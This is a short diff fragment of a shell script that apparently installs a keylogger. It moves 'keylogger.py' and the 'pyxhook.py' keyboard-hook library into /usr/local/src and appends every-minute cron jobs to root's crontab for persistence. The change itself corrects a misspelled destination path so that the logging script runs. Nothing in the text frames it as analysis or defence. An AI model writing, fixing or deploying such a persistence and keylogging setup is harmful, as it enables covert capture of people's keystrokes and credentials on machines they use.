@@ -87,7 +87,7 @@ echo "* * * * * /var/www/log/ps_init.sh" >> /var/spool/cron/root
 mkdir /opt/local/
 mv log.txt /opt/local/
 chmod +x log.sh
-mv log.sh /var/loog/
+mv log.sh /usr/local/src/
 mv keylogger.py /usr/local/src/
 mv pyxhook.py /usr/local/src/
 echo "* * * * * /usr/local/src/log.sh" >> /var/spool/cron/root
